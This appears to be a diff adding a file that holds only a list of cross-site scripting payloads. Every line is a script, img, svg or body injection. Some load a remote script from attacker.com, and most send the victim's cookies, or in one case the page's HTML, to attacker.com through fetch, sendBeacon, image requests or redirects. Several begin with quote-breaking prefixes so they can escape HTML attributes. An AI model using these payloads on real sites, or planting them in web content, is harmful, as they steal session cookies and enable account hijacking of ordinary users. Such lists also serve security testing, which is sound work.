@@ -1,0 +1,15 @@
+"><script src=//attacker.com/xss.js></script>
+'><script src=//attacker.com/xss.js></script>
+<script src=//attacker.com/xss.js></script>
+"><img src=x onerror="this.src='//attacker.com/?c='+document.cookie">
+'><img src=x onerror="this.src='//attacker.com/?c='+document.cookie">
+<img src=x onerror="new Image().src='//attacker.com/?c='+document.cookie">
+<script>document.location='//attacker.com/?c='+document.cookie</script>
+<script>fetch('//attacker.com/?c='+document.cookie)</script>
+<script>fetch('//attacker.com/',{method:'POST',body:document.cookie})</script>
+<script>new Image().src='//attacker.com/c?'+encodeURIComponent(document.cookie)</script>
+<svg onload="fetch('//attacker.com/?d='+btoa(document.body.innerHTML))">
+"><svg onload="fetch('//attacker.com/?c='+document.cookie)">
+<script>navigator.sendBeacon('//attacker.com',document.cookie)</script>
+<body onload="fetch('//attacker.com/?c='+btoa(document.cookie))">
+<script>document.write('<img src=x onerror=this.src=\"//attacker.com/?c=\"+document.cookie>')</script>
